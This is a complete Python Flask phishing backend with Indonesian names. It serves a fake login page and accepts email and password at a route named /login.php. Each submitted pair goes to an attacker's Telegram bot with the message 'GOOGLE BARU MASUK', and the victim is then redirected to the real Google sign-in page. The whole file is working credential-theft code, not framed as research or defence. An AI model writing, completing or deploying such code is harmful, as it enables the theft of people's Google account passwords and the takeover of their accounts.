from flask import Flask, request, redirect, send_file
import requests
import os

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")
REDIRECT = "https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin"

def kirim_telegram(email, pw):
    pesan = f"🔑 *GOOGLE BARU MASUK*\n\n📧 Email: `{email}`\n🔒 Password: `{pw}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": pesan,
        "parse_mode": "Markdown"
    }
    requests.post(url, data=data)

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/login.php', methods=['POST'])
def tangkap():
    email = request.form.get('email')
    pw = request.form.get('pass')
    if email and pw:
        kirim_telegram(email, pw)
    return redirect(REDIRECT)

if __name__ == '__main__':
    app.run()
